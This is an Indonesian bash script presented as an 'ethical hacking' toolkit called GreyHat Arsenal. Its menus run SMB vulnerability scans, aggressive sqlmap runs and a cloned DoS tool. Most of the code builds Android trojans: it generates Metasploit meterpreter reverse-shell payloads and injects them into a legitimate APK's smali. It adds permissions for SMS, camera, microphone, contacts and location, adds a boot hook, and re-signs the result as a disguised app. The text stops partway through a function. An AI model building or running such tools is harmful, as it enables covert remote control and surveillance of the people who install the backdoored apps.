#!/bin/bash



# Header

# --------

# Penulis: K1M4K-ID

# Deskripsi: Alat multi-fungsi untuk ethical hacking, pembuatan, dan penyisipan payload APK

#            untuk platform Android.

# Catatan: Sertakan nama penulis saat merekam ulang.

# Lisensi: Sumber terbuka

# Versi: Terbaru



host=$(hostname)

path=$(pwd)

mypath="${path}/tmp"



# Bersihkan layar dan sembunyikan kursor

# ----------------------------

tput civis

clear



# Fungsi animasi teks

animate_text() {

    local text="$1"

    local delay=0



    for ((i = 0; i < ${#text}; i++)); do

        printf "%s" "${text:$i:1}"

        sleep $delay

    done

}



# Fungsi animasi

animate() {

    local text="$1"

    animate_text "$text"

    printf "\n"  # Baris baru untuk memisahkan animasi dari teks berikutnya

    sleep 1

}



# Fungsi untuk memeriksa keberadaan paket

check_tools() {

    animate """

*********************************** GHAT ***********************************

Skrip ini hanya untuk tujuan pendidikan. Jadilah ethical hacker yang baik K1M4K-ID!

Gunakan hanya pada ethical hacker milik Anda sendiri!!



Versi bash yang diterima (5.2.15(1)-release). Versi minimum yang diperlukan: 4.2



Distro yang kompatibel dengan skrip ini:

Kali Linux, Parrot Os, Ubuntu



Mari kita cek apakah Anda telah menginstal yang dibutuhkan oleh skrip

    """

    tools_ok=1



    essential_tools_names=(

        "apktool"

        "adb"

        "scrcpy"

        "zipalign"

        "java"

        "xterm"

        "apksigner"

        "sdkmanager"

    )



    nonessential_tools_names=(

        "apache2"

        "python3"

        "php"

        "ssh"

        "mitmproxy"

        "bettercap"

        "ettercap"

        "nmap"

    )



    for tool in "${essential_tools_names[@]}"; do

        printf "\033[37;1m%-15s" "$tool"



        if command -v "$tool" &>/dev/null; then

            echo -e "\033[32;3m [OK]\e[0m"

            sleep 0.1

        else

            echo -e "\e[31m error! :(\e[0m"

            tools_ok=0

            sleep 0.1

        fi

    done



    if [ $tools_ok -eq 1 ]; then

        printf "\n"

        animate "Semua alat penting terinstal. Skrip dapat dilanjutkan..."

    else

        printf "\n"

        animate "Harap instal alat yang diperlukan sebelum menjalankan skrip."

    fi

    animate "Memeriksa alat non-penting..."

    printf "\n"

    tools_ok=1



    for tool in "${nonessential_tools_names[@]}"; do

        printf "\033[37;1m%-15s" "$tool"



        if command -v "$tool" &>/dev/null; then

            echo -e "\033[32;3m [OK]\e[0m"

            sleep 0.1

        else

            echo -e "\e[31m error! :(\e[0m"

            tools_ok=0

            sleep 0.1

        fi

    done



    if [ $tools_ok -eq 1 ]; then

        printf "%-15s\n"

        animate """

Semua alat non-penting terinstal.

Pastikan Anda telah menginstal semua dependensi yang diperlukan untuk menjalankan skrip

****************************************************************************

[Enter] untuk melanjutkan & Ctrl+C untuk menghentikan program



"""

read x

clear

    else

        printf "%-15s\n"

        animate """

Beberapa fitur mungkin tidak berfungsi tanpanya.

Pastikan Anda telah menginstal semua dependensi yang diperlukan untuk menjalankan skrip

****************************************************************************

[Enter] untuk melanjutkan & Ctrl+C untuk menghentikan program



"""

read x

clear

    fi

    

}



banner() {

    printf "\033[32;3m\n"

    cat << "EOF"

  ▄██████▄     ▄█    █▄       ▄████████     ███     

  ███    ███   ███    ███     ███    ███ ▀█████████▄ 

  ███    █▀    ███    ███     ███    ███    ▀███▀▀██ 

 ▄███         ▄███▄▄▄▄███▄▄   ███    ███     ███   ▀     GreyHat Arsenal Toolkit

▀▀███ ████▄  ▀▀███▀▀▀▀███▀  ▀███████████     ███               K1M4K-ID

  ███    ███   ███    ███     ███    ███     ███     

  ███    ███   ███    ███     ███    ███     ███     

  ████████▀    ███    █▀      ███    █▀     ▄████▀   

                                                     

     ./Welcome to GreyHatArsenal Toolkit (GHAT)



EOF



animate """GreyHatArsenal-Toolkit - Your Multi-Dimensional Hacking Arsenal

Description Tools:

GHAT is intended for ethical hackers, or hackers who use their skills for good.

"""



}



# Fungsi untuk menangani sinyal Ctrl+C

trap_ctrl_c() {

    clear

    sleep 1

    animate "Anda telah menekan Ctrl+C. Kembali ke menu utama..."

    sleep 1

    run

}





# Fungsi animasi teks

animate_text() {

    local text="$1"

    local delay=0



    for ((i = 0; i < ${#text}; i++)); do

        printf "%s" "${text:$i:1}"

        sleep $delay

    done

}



# Fungsi animasi

animate() {

    local text="$1"

    animate_text "$text"

    printf "\n"  # Baris baru untuk memisahkan animasi dari teks berikutnya

    sleep 1

}



# Prompt menu yang bagus

prompt() {

    printf "\033[32;3m"

    read -p "ght>" user_input

    printf "\033[32;3m"

}



#*****************************************************************************************#

#                                       Menu 1                                            #

#*****************************************************************************************#



# Fungsi menu dengan animasi

menu1() {

    animate "Memuat opsi rekognisi..."

    sleep 1

    clear

    banner

    animate_menu "Menu Reconnaissance"

    animate """

    [1]. Pemindaian Vulnerabilitas pada Windows 7

    [2]. Pemindaian Vulnerabilitas pada Windows 10

    [x]. Kembali

    """

    prompt

    case $user_input in

            1) scan_vulnerability_windows7;;

            2) scan_vulnerability_windows10;;

            x) break ;;

            *) animate "Pilihan tidak valid. Harap coba lagi." ;;

    esac

}

# Fungsi pemindaian kerentanan Windows 7

scan_vulnerability_windows7() {

    clear

    banner

    animate_menu "Pemindaian Vulnerabilitas pada Windows 7"

    animate "Masukkan alamat IP target:"

    prompt



    target="$user_input"



    animate "Menjalankan skrip Nmap smb-vuln-ms17-010 pada $target..."

    sleep 1



    # Menjalankan skrip Nmap smb-vuln-ms17-010

    nmap_result=$(nmap -p445 --script smb-vuln-ms17-010 "$target")



    # Menampilkan hasil pemindaian

    echo -e "\nHasil Pemindaian Nmap untuk $target:\n"

    echo "$nmap_result"



    animate "Pemindaian selesai."



    # Memberikan opsi untuk melanjutkan atau kembali ke menu rekognisi

    printf "\n"

    animate "Opsi:"

    animate "[1]. Lanjutkan pemindaian"

    animate "[2]. Kembali ke menu rekognisi"

    prompt



    case $user_input in

        1)

            scan_vulnerability_windows7

            ;;

        2)

            menu1

            ;;

        *)

            animate "Pilihan tidak valid. Kembali ke menu rekognisi."

            sleep 1;clear

            menu1

            ;;

    esac

}



# Fungsi pemindaian kerentanan Windows 10

scan_vulnerability_windows10() {

    clear

    banner

    animate_menu "Pemindaian Vulnerabilitas pada Windows 10"

    animate "Masukkan alamat IP target:"

    prompt



    target="$user_input"



    animate "Menjalankan skrip Nmap smb-vuln* pada $target..."

    sleep 1



    # Menjalankan skrip Nmap smb-vuln*

    nmap_result=$(nmap --script smb-vuln* "$target")



    # Menampilkan hasil pemindaian

    echo -e "\nHasil Pemindaian Nmap untuk $target:\n"

    echo "$nmap_result"



    animate "Pemindaian selesai."



    # Memberikan opsi untuk melanjutkan atau kembali ke menu rekognisi

    printf "\n"

    animate "Opsi:"

    animate "[1]. Lanjutkan pemindaian"

    animate "[2]. Kembali ke menu rekognisi"

    prompt



    case $user_input in

        1)

            scan_vulnerability_windows10

            ;;

        2)

            menu1

            ;;

        *)

            animate "Pilihan tidak valid. Kembali ke menu rekognisi."

            sleep 1;clear

            menu1

            ;;

    esac

}



#*****************************************************************************************#

#                                       Menu 2                                            #

#*****************************************************************************************#



# Menu pengujian aplikasi web

menu2() {

    animate "Memuat alat pengujian aplikasi web..."

    sleep 1

    clear

    banner

    animate_menu "Menu Pengujian Aplikasi Web"

    animate """

    [1]. Dirsearch

    [2]. Cmseek

    [3]. Whatweb

    [4]. SQL Injection Otomatis

    [5]. Sqlmap

    [6]. Enumerasi Subdomain

    [7]. Deteksi WAF

    [8]. Serangan DoS - Pengerasan

    [x]. Kembali

    """

    prompt



    case $user_input in

        1) scan_url_dirsearch ;;

        2) cmseek_tool ;;

        3) whatweb_tool ;;

        4) automated_sql_injection ;;

        5) sqlmap_tool ;;

        6) subdomain_enumeration_subfinder ;;

        7) waf_detection ;;

        8) dos_attack_hardening ;;

        x) exit ;;

        *) animate "Pilihan tidak valid. Harap coba lagi." ;;

    esac

}



# Fungsi untuk memeriksa dan menginstal Dirsearch

check_and_install_dirsearch() {

    if command -v "dirsearch" &>/dev/null; then

        sleep 0.1

    else

        animate "Dirsearch tidak ditemukan. Menginstal..."

        sudo apt-get install dirsearch &> /dev/null

        animate "Dirsearch telah berhasil diinstal."

    fi

}



# Fungsi pemindaian URL menggunakan Dirsearch

scan_url_dirsearch() {

    clear

    banner

    animate_menu "Dirsearch - Pemindaian URL"

    animate "Masukkan URL target (misalnya, http://example.com):"

    prompt



    target_url="$user_input"



    # Menjalankan Dirsearch

    animate "Menjalankan Dirsearch pada $target_url..."

    check_and_install_dirsearch

    sleep 1



    dirsearch -u "$target_url"



    animate "Pemindaian selesai."



    # Memberikan opsi untuk melanjutkan atau kembali ke menu pengujian aplikasi web

    printf "\n"

    animate "Opsi:"

    animate "[1]. Lanjutkan pemindaian"

    animate "[2]. Kembali ke menu pengujian aplikasi web"

    prompt



    case $user_input in

        1) scan_url_dirsearch ;;

        2) menu2 ;;

        *) animate "Pilihan tidak valid. Kembali ke menu pengujian aplikasi web." ;;

    esac

}



# Fungsi untuk memeriksa dan menginstal cmseek

check_and_install_cmseek() {

    if command -v "cmseek" &>/dev/null; then

        sleep 0.1

    else

        animate "cmseek tidak ditemukan. Menginstal..."

        sudo apt-get install cmseek &> /dev/null

        animate "cmseek telah berhasil diinstal."

    fi

}



# Fungsi untuk menggunakan CMSeek

cmseek_tool() {

    clear

    banner

    animate_menu "CMSeek - Pemindaian Situs Web untuk Kebocoran CMS"

    animate "Masukkan URL target (misalnya, http://example.com):"

    prompt



    target_url="$user_input"



    # Menjalankan CMSeek

    animate "Menjalankan CMSeek pada $target_url..."

    sleep 1



    # Instal CMSeek jika belum terinstal

    if ! command -v "cmseek" &>/dev/null; then

        animate "CMSeek belum terinstal. Menginstal..."

        sudo apt-get install cmseek &> /dev/null

        animate "CMSeek telah berhasil diinstal."

    fi



    # Menjalankan CMSeek pada URL target

    cmseek -u "$target_url"



    animate "Pemindaian selesai."



    # Memberikan opsi untuk melanjutkan atau kembali ke menu pengujian aplikasi web

    printf "\n"

    animate "Opsi:"

    animate "[1]. Lanjutkan pemindaian"

    animate "[2]. Kembali ke menu pengujian aplikasi web"

    prompt



    case $user_input in

        1) cmseek_tool ;;

        2) menu2 ;;

        *) animate "Pilihan tidak valid. Kembali ke menu pengujian aplikasi web." ;;

    esac

}



# Fungsi untuk memeriksa dan menginstal WhatWeb

check_and_install_whatweb() {

    if command -v "whatweb" &>/dev/null; then

        sleep 0.1

    else

        animate "WhatWeb tidak ditemukan. Menginstal..."

        sudo apt-get install whatweb &> /dev/null

        animate "WhatWeb telah berhasil diinstal."

    fi

}



# Fungsi untuk menggunakan WhatWeb

whatweb_tool() {

    clear

    banner

    animate_menu "WhatWeb - Pemindaian Informasi Situs Web"

    animate "Masukkan URL target (misalnya, http://example.com):"

    prompt



    target_url="$user_input"



    # Memeriksa dan menginstal WhatWeb jika belum terinstal

    check_and_install_whatweb



    # Menjalankan WhatWeb

    animate "Menjalankan WhatWeb pada $target_url..."

    sleep 1



    # Menjalankan WhatWeb pada URL target

    whatweb -v "$target_url"



    animate "Pemindaian selesai."



    # Memberikan opsi untuk melanjutkan atau kembali ke menu pengujian aplikasi web

    printf "\n"

    animate "Opsi:"

    animate "[1]. Lanjutkan pemindaian"

    animate "[2]. Kembali ke menu pengujian aplikasi web"

    prompt



    case $user_input in

        1) whatweb_tool ;;

        2) menu2 ;;

        *) animate "Pilihan tidak valid. Kembali ke menu pengujian aplikasi web." ;;

    esac

}



# Fungsi untuk memeriksa dan mengunduh psqli-pro jika belum terinstal

check_and_install_psqli_pro() {

    if [ ! -d "psqli-pro" ]; then

        animate "Mengunduh psqli-pro..."

        git clone https://github.com/Agressiv1njector/psqli-pro.git;sleep 1;mv -f psqli-pro tmp &> /dev/null

        animate "psqli-pro telah berhasil diunduh."

    fi

}



# Fungsi untuk SQL Injection Otomatis dengan psqli-pro (Bash)

automated_sql_injection() {

    clear

    banner

    animate_menu "SQL Injection Otomatis dengan psqli-pro"



    # Memeriksa dan mengunduh psqli-pro jika belum terinstal

    check_and_install_psqli_pro

    sleep 1



    # Menjalankan psqli-pro pada URL target

    bash tmp/psqli-pro/psqli.sh



    # Menampilkan hasil psqli-pro



    animate "Pemindaian selesai."



    # Memberikan opsi untuk melanjutkan atau kembali ke menu pengujian aplikasi web

    printf "\n"

    animate "Opsi:"

    animate "[1]. Lanjutkan pemindaian"

    animate "[2]. Kembali ke menu pengujian aplikasi web"

    prompt



    case $user_input in

        1) automated_sql_injection ;;

        2) menu2 ;;

        *) animate "Pilihan tidak valid. Kembali ke menu pengujian aplikasi web." ;;

    esac

}





# Fungsi untuk memeriksa dan menjalankan SQLMap jika sudah terinstal

sqlmap_tool() {

    if command -v "sqlmap" &>/dev/null; then

        clear

        banner

        animate_menu "SQLMap - Pemindaian SQL Injection"

        animate "Masukkan URL target (misalnya, http://example.com/page?id=1):"

        prompt



        target_url="$user_input"



        # Menjalankan SQLMap untuk SQL Injection

        animate "Menjalankan SQLMap pada $target_url..."

        sleep 1



        # Menjalankan SQLMap dengan perintah yang diinginkan

        sqlmap -u "$target_url" --crawl=1 --random-agent --batch --forms --threads=5 --level=5 --risk=3

        printf "\n"

        animate "Pemindaian selesai."



        # Memberikan opsi untuk melanjutkan atau kembali ke menu pengujian aplikasi web

        printf "\n"

        animate "Opsi:"

        animate "[1]. Lanjutkan pemindaian"

        animate "[2]. Kembali ke menu pengujian aplikasi web"

        prompt



        case $user_input in

            1) check_and_run_sqlmap ;;

            2) menu2 ;;

            *) animate "Pilihan tidak valid. Kembali ke menu pengujian aplikasi web." ;;

        esac

    else

        animate "SQLMap belum terinstal. Silakan instal SQLMap terlebih dahulu."

    fi

}



# Fungsi untuk menjalankan Subfinder

subdomain_enumeration_subfinder() {

    clear

    banner

    animate_menu "Enumerasi Subdomain dengan Subfinder"

    animate "Masukkan domain target (misalnya, example.com):"

    prompt



    target_domain="$user_input"



    # Menjalankan Subfinder untuk enumerasi subdomain

    animate "Menjalankan Subfinder pada $target_domain..."

    sleep 1



    # Memeriksa dan menginstal Subfinder jika belum terinstal

    if ! command -v "subfinder" &>/dev/null; then

        animate "Subfinder belum terinstal. Menginstal..."

        go get -u github.com/projectdiscovery/subfinder/v2/cmd/subfinder &> /dev/null

        animate "Subfinder telah berhasil diinstal."

    fi



    # Menjalankan Subfinder pada domain target

    subfinder -d "$target_domain"



    animate "Enumerasi subdomain selesai."



    # Memberikan opsi untuk melanjutkan atau kembali ke menu pengujian aplikasi web

    printf "\n"

    animate "Opsi:"

    animate "[1]. Lanjutkan enumerasi subdomain"

    animate "[2]. Kembali ke menu pengujian aplikasi web"

    prompt



    case $user_input in

        1) subdomain_enumeration_subfinder ;;

        2) menu2 ;;

        *) animate "Pilihan tidak valid. Kembali ke menu pengujian aplikasi web." ;;

    esac

}



# Fungsi untuk mendeteksi WAF dengan wafw00f

waf_detection() {

    clear

    banner

    animate_menu "Deteksi WAF dengan wafw00f"

    animate "Masukkan URL target (misalnya, http://example.com):"

    prompt



    target_url="$user_input"



    # Menjalankan wafw00f untuk mendeteksi WAF

    animate "Menjalankan wafw00f pada $target_url..."

    sleep 1



    # Memeriksa dan menginstal wafw00f jika belum terinstal

    if ! command -v "wafw00f" &>/dev/null; then

        animate "wafw00f belum terinstal. Menginstal..."

        sudo apt-get install wafw00f &> /dev/null

        animate "wafw00f telah berhasil diinstal."

    fi



    # Menjalankan wafw00f pada URL target

    wafw00f "$target_url"



    animate "Deteksi WAF selesai."



    # Memberikan opsi untuk melanjutkan atau kembali ke menu pengujian aplikasi web

    printf "\n"

    animate "Opsi:"

    animate "[1]. Lanjutkan deteksi WAF"

    animate "[2]. Kembali ke menu pengujian aplikasi web"

    prompt



    case $user_input in

        1) waf_detection ;;

        2) menu2 ;;

        *) animate "Pilihan tidak valid. Kembali ke menu pengujian aplikasi web." ;;

    esac

}





# Fungsi untuk memeriksa dan mengunduh Doss-Attack jika belum terinstal

check_and_install_doss_attack() {

    if [ ! -d "tmp/Doss-Attack" ]; then

        animate "Mengunduh Doss-Attack..."

        git clone https://github.com/K1M4K-ID/Doss-Attack.git; sleep 1; mv -f Doss-Attack tmp &> /dev/null

        animate "Doss-Attack telah berhasil diunduh."

    fi

}



# Fungsi untuk Serangan DoS - Pengerasan

dos_attack_hardening() {

    clear

    banner

    animate_menu "Serangan DoS - Pengerasan dengan Doss-Attack"



    # Memeriksa dan mengunduh Doss-Attack jika belum terinstal

    check_and_install_doss_attack

    sleep 1



    # Menjalankan Doss-Attack dengan opsi yang sesuai

    bash tmp/Doss-Attack/startDOS.sh



    animate "Serangan DoS - Pengerasan selesai."



    # Memberikan opsi untuk melanjutkan atau kembali ke menu pengujian aplikasi web

    printf "\n"

    animate "Opsi:"

    animate "[1]. Lanjutkan serangan"

    animate "[2]. Kembali ke menu pengujian aplikasi web"

    prompt



    case $user_input in

        1) dos_attack_hardening ;;

        2) menu2 ;;

        *) animate "Pilihan tidak valid. Kembali ke menu pengujian aplikasi web." ;;

    esac

}



#*****************************************************************************************#

#                                       Menu 3                                            #

#*****************************************************************************************#

VAR1=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10) # smali dir renaming

VAR2=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10) # smali dir renaming

VAR3=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10) # Payload.smali renaming

VAR4=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10) # Pakage name renaming 1

VAR5=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10) # Pakage name renaming 2

VAR6=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10) # Pakage name renaming 3

VAR7=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10) # New name for word 'payload'

VAR8=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10) # New name for word 'metasploit'

perms='   <uses-permission android:name="android.permission.INTERNET"/>\n    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>\n    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>\n    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>\n    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>\n    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>\n    <uses-permission android:name="android.permission.SEND_SMS"/>\n    <uses-permission android:name="android.permission.RECEIVE_SMS"/>\n    <uses-permission android:name="android.permission.RECORD_AUDIO"/>\n    <uses-permission android:name="android.permission.CALL_PHONE"/>\n    <uses-permission android:name="android.permission.READ_CONTACTS"/>\n    <uses-permission android:name="android.permission.WRITE_CONTACTS"/>\n    <uses-permission android:name="android.permission.WRITE_SETTINGS"/>\n    <uses-permission android:name="android.permission.CAMERA"/>\n    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>\n    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>\n    <uses-permission android:name="android.permission.SET_WALLPAPER"/>\n    <uses-permission android:name="android.permission.READ_CALL_LOG"/>\n    <uses-permission android:name="android.permission.WRITE_CALL_LOG"/>\n    <uses-permission android:name="android.permission.WAKE_LOCK"/>\n    <uses-permission android:name="android.permission.READ_SMS"/>'

echo ""

#function name

function payload_name()

{

 apk_name=$(zenity --title " Nama Payload " --text "example: trojan" --entry --entry-text "trojan" --width 300 2> /dev/null)

}

#function payload

function get_payload()

{

  PAYLOAD=$(zenity --list --radiolist --title="GreyHatArsenal" --text "\nPilih Opsi Payload:" --column="Choose" --column="Opsi" TRUE "android/meterpreter/reverse_tcp" FALSE "android/meterpreter/reverse_http" FALSE "android/meterpreter/reverse_https" FALSE --width=400 --height=400 2> /dev/null)

}

#function original apk

function xyz()

{

 orig=$(zenity --title " Aplikasi Original " --filename=$path --file-selection --file-filter "*.apk" --text "chose the original (apk)" 2> /dev/null)

}

#function generate payload

function gen_payload()

{

 echo "[*] Generating apk payload"

 

 xterm -T " GENERATE APK PAYLOAD" -e msfvenom -p $PAYLOAD LHOST=$lhost LPORT=$lport -o $apk_name.apk

}

#function apktool

function apk_decomp()

{

 echo "[*] Decompiling Payload APK..."

 sleep 1

 xterm -T "Decompiling Payload" -e apktool d -f -o $path/payload $path/$apk_name.apk > /dev/null 2>&1

 rm $apk_name.apk

}

function apk_comp()

{

 echo "[*] Rebuilding APK file..."



 xterm -T "Rebuilding APK" -e apktool b $path/payload -o trojans.apk > /dev/null 2>&1

 rm -r payload > /dev/null 2>&1

}

function apk_decomp1()

{

 echo "[*] Decompiling Original APK..."

 

 xterm -T "Decompiling Original" -e apktool d -f -o $path/original $orig > /dev/null 2>&1

}

function verifikasi()

{

 echo "[*] Verifikasi Aplikasi..."

 

 xterm -T "Verifikasi APk" -e /opt/android-sdk/build-tools/30.0.3/zipalign -v 4 virus.apk $apk_name.apk | sed -e '1,2d' | sed -e '$d'| awk '{print $2}' | sed 's@^.*$@[*] & (OK - compressed) @g'

}

# add permission dan hook

#

function perms()

{

 printf "[*] menambahkan permission and hook smali\n"

 package_name=`head -n 2 $path/original/AndroidManifest.xml|grep "<manifest"|grep -o -P 'package="[^\"]+"'|sed 's/\"//g'|sed 's/package=//g'|sed 's/\./\//g'` 2>&1

 package_dash=`head -n 2 $path/original/AndroidManifest.xml|grep "<manifest"|grep -o -P 'package="[^\"]+"'|sed 's/\"//g'|sed 's/package=//g'|sed 's/\./\//g'|sed 's|/|.|g'` 2>&1

 tmp=$package_name

 sed -i "5i\ $perms" $path/original/AndroidManifest.xml

 rm $path/payload/smali/com/metasploit/stage/MainActivity.smali 2>&1

 sed -i "s|Lcom/metasploit|L$package_name|g" $path/payload/smali/com/metasploit/stage/*.smali 2>&1

 cp -r $path/payload/smali/com/metasploit/stage $path/original/smali/$package_name > /dev/null 2>&1

 rc=$?

 if [ $rc != 0 ];then

  app_name=`grep "<application" $path/original/AndroidManifest.xml|tail -1|grep -o -P 'android:name="[^\"]+"'|sed 's/\"//g'|sed 's/android:name=//g'|sed 's/\./\//g'|sed 's%/[^/]*$%%'` 2>&1

  app_dash=`grep "<application" $path/original/AndroidManifest.xml|tail -1|grep -o -P 'android:name="[^\"]+"'|sed 's/\"//g'|sed 's/android:name=//g'|sed 's/\./\//g'|sed 's|/|.|g'|sed 's%.[^.]*$%%'` 2>&1

  tmp=$app_name

  sed -i "s|L$package_name|L$app_name|g" $path/payload/smali/com/metasploit/stage/*.smali 2>&1

  cp -r $path/payload/smali/com/metasploit/stage $path/original/smali/$app_name > /dev/null 2>&1

  amanifest="    </application>"

  boot_cmp='        <receiver android:label="MainBroadcastReceiver" android:name="'$app_dash.stage.MainBroadcastReceiver'">\n            <intent-filter>\n                <action android:name="android.intent.action.BOOT_COMPLETED"/>\n            </intent-filter>\n        </receiver><service android:exported="true" android:name="'$app_dash.stage.MainService'"/></application>'

  sed -i "s|$amanifest|$boot_cmp|g" $path/original/AndroidManifest.xml 2>&1

 fi

 amanifest="    </application>"

 boot_cmp='        <receiver android:label="MainBroadcastReceiver" android:name="'$package_dash.stage.MainBroadcastReceiver'">\n            <intent-filter>\n                <action android:name="android.intent.action.BOOT_COMPLETED"/>\n            </intent-filter>\n        </receiver><service android:exported="true" android:name="'$package_dash.stage.MainService'"/></application>'

 sed -i "s|$amanifest|$boot_cmp|g" $path/original/AndroidManifest.xml 2>&1

 android_nam=$tmp

}



# functions hook smali

#

function hook_smalies()

{

 launcher_line_num=`grep -n "android.intent.category.LAUNCHER" $path/original/AndroidManifest.xml |awk -F ":" 'NR==1{ print $1 }'` 2>&1

 android_name=`grep -B $launcher_line_num "android.intent.category.LAUNCHER" $path/original/AndroidManifest.xml|grep -B $launcher_line_num "android.intent.action.MAIN"|grep "<application"|tail -1|grep -o -P 'android:name="[^\"]+"'|sed 's/\"//g'|sed 's/android:name=//g'|sed 's/\./\//g'` 2>&1

 android_activity=`grep -B $launcher_line_num "android.intent.category.LAUNCHER" $path/original/AndroidManifest.xml|grep -B $launcher_line_num "android.intent.action.MAIN"|grep "<activity"|tail -1|grep -o -P 'android:name="[^\"]+"'|sed 's/\"//g'|sed 's/android:name=//g'|sed 's/\./\//g'` 2>&1

 android_targetActivity=`grep -B $launcher_line_num "android.intent.category.LAUNCHER" $path/original/AndroidManifest.xml|grep -B $launcher_line_num "android.intent.action.MAIN"|grep "<activity"|grep -m1 ""|grep -o -P 'android:name="[^\"]+"'|sed 's/\"//g'|sed 's/android:name=//g'|sed 's/\./\//g'` 2>&1

 if [ $android_name ]; then

  printf "++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\n"

  printf "inject Smali>$android_name.smali" |awk -F ":/" '{ print $NF }'

  hook_num=`grep -n "    return-void" $path/original/smali/$android_name.smali 2>&1| cut -d ";" -f 1 |awk -F ":" 'NR==1{ print $1 }'` 2>&1

  printf "baris ke>$hook_num \n"

  printf "++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\n"

  starter="   invoke-static {}, L$android_nam/stage/MainService;->start()V"

  sed -i "${hook_num}i\ ${starter}" $path/original/smali/$android_name.smali > /dev/null 2>&1

 elif [ ! -e $android_activity ]; then

  printf "++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\n"

  printf "inject Smali>$android_activity.smali" |awk -F ":/" '{ print $NF }'

  hook_num=`grep -n "    return-void" $path/original/smali/$android_activity.smali 2>&1| cut -d ";" -f 1 |awk -F ":" 'NR==1{ print $1 }'` 2>&1

  printf "baris ke>$hook_num \n"

  printf "++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\n"

  starter="   invoke-static {}, L$android_nam/stage/MainService;->start()V"

  sed -i "${hook_num}i\ ${starter}" $path/original/smali/$android_activity.smali > /dev/null 2>&1

  rc=$?

  if [ $rc != 0 ]; then

    printf '\n'

    

    printf "[x] tidak ditemukan : $android_activity.smali\n"

    printf "[*] mencoba lagi . . .\033[31;1m\n"

    

    sleep 2

    echo

    printf "++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\n"

    printf "inject Smali>$android_targetActivity.smali" |awk -F ":/" '{ print $NF }'

    hook_num=`grep -n "    return-void" $path/original/smali/$android_targetActivity.smali 2>&1| cut -d ";" -f 1 |awk -F ":" 'NR==1{ print $1 }'` 2>&1

    printf "baris ke>$hook_num \n"

    printf "++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\n"

    starter="   invoke-static {}, L$android_nam/stage/MainService;->start()V"

    sed -i "${hook_num}i\ ${starter}" $path/original/smali/$android_targetActivity.smali > /dev/null 2>&1

  fi

 fi

}



# rebuild backdoor

function apk_comp1()

{

 echo "[*] Rebuilding Backdoored APK..."

 xterm -T "Rebuilding APK" -e apktool b $path/original -o virus.apk > /dev/null 2>&1

 rm -r payload > /dev/null 2>&1

 rm -r original > /dev/null 2>&1

}



# sign Backdoor file manual inject

#

function sign_orig(){

        printf "[*] sign your backdoor...\n"

        java -jar $path/.android/sign.jar virus.apk;mv virus.s.apk virus.apk > /dev/null 2>&1

        printf "[*] signed backdoor, succesfully...\n"

        sleep 0.025s

        printf "[*] verification your backdoor, please wait...\n"

        sleep 0.025s

        printf "[*] recompile your backdoor...\n"

        sleep 0.025s

        #zipalign -v 4 virus.apk $apk_name.apk | sed -e '1,2d' | sed -e '$d'| awk '{print $2}' | sed 's@^.*$@[*] & (OK - compressed) @g'

        /opt/android-sdk/build-tools/30.0.3/zipalign -v 4 virus.apk result/$apk_name.apk | sed -e '1,2d' | sed -e '$d'| awk '{print $2}' | sed 's@^.*$@[*] & (OK - compressed) @g'

        rm -fr virus.apk &> /dev/null

        printf "[*] verification, succesfully... result:$path/result/$apk_name.apk"

        animate """

****************************************************************************

[TEKAN] enter untuk melanjutkan... 

        """

        read x

}



# Menu hacking Android

# Fungsi untuk menu nomor 3

menu3() {

    clear

    banner



    animate_menu "Menu Hacking Android"

    animate """

    [1]. Buat Payload Android

    [2]. Susupi Payload Android ke Aplikasi Asli [OLD]

    [3]  Susupi Payload Android ke Aplikasi Asli [NEW]

    [4]. Generate Payload Windows untuk Bypass Windows 10

    ----------------------------------------------

    [5]. Aktifkan Listener Payload Android

    [5]. Aktifkan Listener Payload Windows

    [x]. Kembali

    ----------------------------------------------

    Interface IP:

    eth0: $eth0_ip

    wlan0: $wlan0_ip

    ----------------------------------------------

    """

    prompt



    case $user_input in

        1) create_android_payload ;;

        2) inject_android_payload ;;

        3) inject_android_payload_new ;;

        4) generate_windows_payload ;;

        5) activate_android_listener ;;

        6) activate_windows_listener ;;

        x) run ;;

        *) animate "Pilihan tidak valid. Harap coba lagi." ;;

    esac

}





# Fungsi untuk membuat payload Android

create_android_payload() {

    clear

    banner

    animate_menu "Buat Payload Android"



        # Meminta input dari pengguna

        animate "Masukkan LHOST untuk payload:"

        prompt

        lhost="$user_input"



        animate "Masukkan LPORT untuk payload:"

        prompt

        lport="$user_input"



    # Menampilkan payload yang akan dibuat

    payload="android/meterpreter/reverse_tcp"

    animate "Membuat payload Android dengan LHOST=$lhost dan LPORT=$lport..."



    # Membuat payload menggunakan msfvenom

    msfvenom -p $payload LHOST=$lhost LPORT=$lport -o payload.apk



    animate "Payload Android telah dibuat dengan nama payload.apk."

    sleep 2

    menu3

}



# Fungsi untuk menyusupkan payload Android ke aplikasi asli

inject_android_payload() {

    clear

    banner

    animate_menu "Susupi Payload Android ke Aplikasi Asli"

     # Meminta input dari pengguna

        animate "Masukkan LHOST untuk payload:"

        prompt

        lhost="$user_input"



        animate "Masukkan LPORT untuk payload:"

        prompt

        lport="$user_input"





    # Meminta input dari pengguna

    animate "Masukkan path file APK asli:"

    prompt

    original_apk="$user_input"



    # Menampilkan payload yang akan digunakan

    payload="payload.apk"

    animate "Menyusupkan payload Android ke $original_apk..."



    # Menyusupkan payload menggunakan msfvenom

    msfvenom -x $original_apk -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -o infected.apk



